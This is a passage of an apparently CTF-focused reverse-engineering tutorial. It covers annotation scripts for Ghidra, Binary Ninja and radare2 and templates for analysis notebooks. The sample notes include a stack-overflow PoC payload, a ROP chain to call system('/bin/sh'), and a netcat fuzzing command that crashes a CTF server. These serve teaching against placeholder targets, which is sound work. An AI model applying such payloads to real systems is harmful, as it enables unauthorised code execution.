            string_val = string_addr.getValue().lower()
            
            for pattern in patterns:
                if pattern in string_val:
                    # Mark string
                    listing.setComment(string_addr.getAddress(), 
                                      CodeUnit.PLATE_COMMENT,
                                      f"🔑 INTERESTING: Contains '{pattern}'")
                    
                    # Mark all xrefs
                    refs = getReferencesTo(string_addr.getAddress())
                    for ref in refs:
                        ref_addr = ref.getFromAddress()
                        listing.setComment(ref_addr, CodeUnit.EOL_COMMENT,
                                          f"References: {pattern} string")
                        setBackgroundColor(ref_addr, java.awt.Color.YELLOW)

# Run annotations
transaction_id = program.startTransaction("Auto Annotate")
try:
    annotate_dangerous_calls()
    annotate_interesting_strings()
    program.endTransaction(transaction_id, True)
    print("Annotation complete")
except Exception as e:
    program.endTransaction(transaction_id, False)
    print(f"Error: {e}")
```

### Binary Ninja Annotations

**Binary Ninja API Annotations:**

```python
# Binary Ninja Python API
import binaryninja as bn

# Load binary
bv = bn.open_view("/path/to/binary")

# Set function name
func = bv.get_function_at(0x401000)
if func:
    func.name = "validate_license"
    
    # Set function comment
    func.comment = "Main license validation\nReturns 1 if valid, 0 otherwise"
    
    # Set parameter names
    func.parameter_vars[0].name = "license_key"
    func.parameter_vars[0].type = bv.parse_type_string("char*")[0]

# Add comment at address
bv.set_comment_at(0x401010, "Check magic bytes: 0x42424242")

# Define data type
struct_type = bv.parse_type_string("struct { uint32_t magic; uint8_t type; uint16_t len; }")[0]
bv.define_user_data_var(0x601000, struct_type, "protocol_msg")

# Apply tags
func.add_tag("vulnerability", "Buffer Overflow", True)
func.add_tag("crypto", "Uses AES", False)

# Set instruction highlighting
func.set_auto_instr_highlight(0x401020, bn.HighlightStandardColor.RedHighlightColor)
```

**Binary Ninja Plugin for Annotation:**

```python
# Binary Ninja plugin: annotation_helper.py
from binaryninja import *

class AnnotationHelper:
    """Helper for consistent annotations across analysis"""
    
    COLORS = {
        'danger': HighlightStandardColor.RedHighlightColor,
        'crypto': HighlightStandardColor.GreenHighlightColor,
        'input': HighlightStandardColor.BlueHighlightColor,
        'interesting': HighlightStandardColor.MagentaHighlightColor,
    }
    
    def __init__(self, bv):
        self.bv = bv
    
    def mark_dangerous_function(self, func_addr, reason):
        """Mark function as containing vulnerability"""
        func = self.bv.get_function_at(func_addr)
        if func:
            func.comment = f"⚠️ DANGER: {reason}\n" + (func.comment or "")
            func.add_tag("vulnerability", reason, True)
            
            # Highlight all instructions
            for block in func.basic_blocks:
                for addr in range(block.start, block.end):
                    func.set_auto_instr_highlight(addr, self.COLORS['danger'])
    
    def mark_crypto_usage(self, addr, algorithm):
        """Mark cryptographic operations"""
        self.bv.set_comment_at(addr, f"🔐 Crypto: {algorithm}")
        
        func = self.bv.get_function_at(addr)
        if func:
            func.add_tag("crypto", algorithm, False)
            func.set_auto_instr_highlight(addr, self.COLORS['crypto'])
    
    def annotate_buffer(self, addr, size, name, purpose):
        """Annotate buffer with size and purpose"""
        comment = f"Buffer: {name} ({size} bytes)\nPurpose: {purpose}"
        self.bv.set_comment_at(addr, comment)
        
        # Define as array
        array_type = self.bv.parse_type_string(f"char [{size}]")[0]
        self.bv.define_user_data_var(addr, array_type, name)

# Usage in analysis
def analyze_binary(bv):
    helper = AnnotationHelper(bv)
    
    # Mark known vulnerabilities
    helper.mark_dangerous_function(0x401000, "strcpy without bounds check")
    
    # Mark crypto
    helper.mark_crypto_usage(0x402000, "AES-256-CBC")
    
    # Annotate buffers
    helper.annotate_buffer(0x601000, 256, "input_buffer", "User input storage")

PluginCommand.register("Annotate Binary", "Run annotation helper", analyze_binary)
```

### radare2 Annotations

**radare2 Comments and Metadata:**

```bash
# radare2 command-line annotations

r2 -AA binary

# Add comment
[0x00400000]> CCu "Main validation function" @ 0x401000

# Add function comment
[0x00400000]> afCc "Validates license format" @ sym.validate

# Rename function
[0x00400000]> afn validate_license @ 0x401000

# Add flag/bookmark
[0x00400000]> f vuln_strcpy @ 0x401050

# Set function signature
[0x00400000]> afts "int validate_license(char *key)" @ 0x401000

# Add metadata
[0x00400000]> Cmd "Dangerous: uses strcpy" @ 0x401050

# Add reference comment
[0x00400000]> CCu "Calls dangerous function" @ 0x401030

# Save project with annotations
[0x00400000]> Ps analysis_project
```

**radare2 Python Automation:**

```python
#!/usr/bin/env python3
import r2pipe

# Open binary
r2 = r2pipe.open("./binary")
r2.cmd("aaa")  # Analyze

# Function to add annotations
def annotate_binary():
    # Get functions
    functions_json = r2.cmdj("aflj")
    
    for func in functions_json:
        addr = func['offset']
        name = func['name']
        
        # Annotate dangerous functions
        if any(danger in name for danger in ['strcpy', 'sprintf', 'gets']):
            r2.cmd(f'CCu "⚠️ DANGEROUS FUNCTION" @ {addr}')
            r2.cmd(f'f vuln.{name} @ {addr}')
        
        # Annotate crypto functions
        if any(crypto in name for crypto in ['md5', 'sha', 'aes', 'rsa']):
            r2.cmd(f'CCu "🔐 Cryptographic function" @ {addr}')
            r2.cmd(f'f crypto.{name} @ {addr}')
    
    # Annotate strings
    strings = r2.cmdj("izj")
    for string in strings:
        string_val = string['string'].lower()
        addr = string['vaddr']
        
        if 'flag' in string_val or 'password' in string_val:
            r2.cmd(f'CCu "🔑 Interesting string" @ {addr}')
            
            # Find and annotate xrefs
            xrefs = r2.cmdj(f'axtj @ {addr}')
            if xrefs:
                for xref in xrefs:
                    xref_addr = xref['from']
                    r2.cmd(f'CCu "References interesting string" @ {xref_addr}')
    
    print("Annotations complete")

# Run
annotate_binary()

# Save project
r2.cmd("Ps annotated_analysis")
r2.quit()
```

## Creating Analysis Notes

### Note-Taking Strategies

**Structured Note Format:**

````markdown
# Binary Analysis: challenge.bin
**Date:** 2025-10-12
**Analyst:** Your Name
**Status:** In Progress

## Executive Summary
- Binary Type: ELF 64-bit LSB executable
- Architecture: x86-64
- Purpose: License validation server
- Key Finding: Buffer overflow in input handling

## Initial Triage
### File Information
```bash
$ file challenge.bin
ELF 64-bit LSB executable, x86-64, dynamically linked

$ checksec --file=challenge.bin
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
````

### Strings of Interest

- "Enter license key:" - Input prompt at 0x400890
- "Access Granted" - Success message at 0x4008f0
- "/bin/sh" - Shell string at 0x601050

## Function Analysis

### validate_license (0x401000)

**Purpose:** Main license validation routine **Arguments:** `char *license_key` **Return:** `int` (1=valid, 0=invalid)

**Control Flow:**

```
0x401000: Function prologue
0x401010: Call strlen() on input
0x401020: Check length == 16
0x401030: Checksum validation loop
0x401050: Compare checksum with 0xDEADBEEF
0x401060: Return result
```

**Vulnerabilities:**

- No bounds checking before strlen()
- Stack buffer only 12 bytes but accepts 16+

**Exploitation Notes:**

- Offset to return address: 20 bytes
- Can overwrite RIP with 4 bytes overflow

### compute_hash (0x402000)

**Purpose:** Custom hash function for license validation **Algorithm:**

```python
def compute_hash(data):
    hash_val = 0x5A5A5A5A
    for byte in data:
        hash_val ^= byte
        hash_val = ((hash_val << 3) | (hash_val >> 29)) & 0xFFFFFFFF
    return hash_val
```

## Vulnerability Analysis

### Buffer Overflow (validate_license)

**Location:** 0x401000 **Severity:** Critical **Type:** Stack-based buffer overflow

**Description:** Function allocates 12-byte buffer but reads up to 64 bytes from stdin using `fgets()`.

**Affected Code:**

```c
char buffer[12];
fgets(buffer, 64, stdin);  // Overflow!
```

**Exploitation Path:**

1. Send 20 bytes to reach return address
2. Overwrite RIP with address of `system@plt` (0x400560)
3. Next 8 bytes become argument (pointer to "/bin/sh")

**PoC:**

```python
payload = b'A' * 20 + p64(0x400560) + p64(0x601050)
```

## Exploitation Strategy

### Approach 1: ret2libc

Not viable - no libc leak mechanism

### Approach 2: ret2shellcode

Not viable - NX enabled

### Approach 3: ROP Chain ✓ SELECTED

**Requirements:**

- ROP gadgets (available)
- Known addresses (PIE disabled)
- `/bin/sh` string (present at 0x601050)

**Chain:**

```
[padding: 20 bytes]
[pop rdi; ret] @ 0x400893
[/bin/sh addr] @ 0x601050
[system@plt] @ 0x400560
```

## Next Steps

- [ ] Verify ROP gadgets with ROPgadget
- [ ] Test exploit locally
- [ ] Adapt for remote target
- [ ] Check for additional protections

## References

- Original challenge: https://ctf.example.com/challenge123
- Similar exploits: CVE-2019-1234

````

### Digital Lab Notebook

**Obsidian/Markdown-Based Notebook:**
```markdown
# Analysis Session: 2025-10-12 14:30

## Current Focus
Analyzing custom protocol in network challenge

## Observations

### Protocol Structure Discovery
Found repeating pattern in pcap:
````

42 42 42 42 # Magic bytes 01 # Message type 00 10 # Length (16 bytes) [payload]

````

Hypothesis: Type-Length-Value format

**Test:** Send malformed length field
```bash
echo -ne '\x42\x42\x42\x42\x01\xFF\xFF' | nc target.ctf 1337
````

Result: Server crashes! Possible integer overflow

### Follow-up Questions

- Is length field signed or unsigned?
- What's the maximum safe length?
- Does server validate magic bytes?

## Timeline

- 14:30: Started analysis
- 14:45: Identified protocol structure
- 15:00: Discovered crash via fuzzing
- 15:15: Confirmed integer overflow

## Code Snippets

```python
# Working client connection
import socket
sock = socket.socket()
sock.connect(('target.ctf', 1337))
sock.send(b'\x42' * 4 + b'\x01\x00\x10' + b'A' * 16)
response = sock.recv(1024)
print(response)
```

## Ideas to Explore

- [ ] Fuzz all message types (0x00-0xFF)
- [ ] Test negative length values
- [ ] Check for format string in payload
- [ ] Look for command injection points

## Blockers

None currently

## Resources Used

- Wireshark for packet analysis
- Python scapy for protocol recreation
- Boofuzz for fuzzing

#ctf #reversing #protocol-analysis #vulnerability

````

### Collaborative Note Format (Team Analysis)

**Notion/Confluence Template:**
```markdown
# Challenge: Reverse Engineering - CryptoValidator

## Team Information
- **Lead Analyst:** Alice
- **Supporting:** Bob, Charlie
- **Start Time:** 2025-10-12 10:00
- **Status:** 🟡 In Progress

## Task Assignment
| Task | Assignee | Status | Notes |
|------|----------|--------|-------|
| Static analysis | Alice | ✅ Complete | Found main validation at 0x401000 |
| Dynamic analysis | Bob | 🟡 In Progress | Setting up gdb environment |
| Crypto reverse engineering | Charlie | 🟡 In Progress | Analyzing hash function |
| Exploit development | Alice | ⏳ Waiting | Blocked on crypto analysis |

## Shared Findings

### Alice's Analysis (Static)
**Functions Identified:**
- `main()` @ 0x400800
- `validate_license()` @ 0x401000  
- `compute_hash()` @ 0x402000
- `check_signature()` @ 0x403000

**Call Graph:**
````

main ├── validate_license │ ├── compute_hash │ └── check_signature └── grant_access

```

**Vulnerabilities:**
1. Buffer overflow in validate_license (offset 20)
2. Integer overflow in compute_hash loop

### Bob's Analysis (Dynamic)
**Observed Behavior:**
```

Input: "AAAA" Output: "Invali